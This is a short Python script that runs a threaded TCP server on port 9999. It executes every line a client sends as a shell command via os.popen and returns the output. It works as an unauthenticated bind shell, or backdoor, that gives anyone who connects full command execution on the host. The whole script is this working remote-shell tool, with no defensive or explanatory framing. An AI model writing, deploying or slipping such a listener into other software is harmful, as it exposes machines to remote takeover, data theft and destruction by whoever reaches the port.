import socketserver
import os

class MyTCPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        while True:
            self.data = self.request.recv(8092).decode().strip()
            if not self.data:
                break
            print("{} wrote:".format(self.client_address[0]))
            # print(self.data)
            output = os.popen(self.data).read()
            self.request.sendall(output.encode())

if __name__ == "__main__":
    HOST, PORT = '', 9999
    print("waiting for incoming connections......")
    server = socketserver.ThreadingTCPServer((HOST, PORT), MyTCPHandler)
    server.serve_forever()
